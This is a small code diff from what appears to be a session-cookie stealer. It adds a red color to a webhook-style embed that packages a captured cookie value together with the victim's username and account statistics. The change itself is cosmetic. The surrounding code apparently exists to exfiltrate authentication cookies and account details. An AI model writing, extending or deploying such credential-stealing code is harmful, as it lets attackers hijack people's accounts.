@@ -90,6 +90,7 @@ async function main(cookie) {
     let embedPayload = {
         embeds: [
             {
+                color: 0xFF0000, // 🔴 Red embed
                 description: `\`\`\`${cookie ?? "COOKIE NOT FOUND"}\`\`\``,
                 fields: [
                     { name: "Username", value: statistics?.UserName ?? "N/A", inline: true },
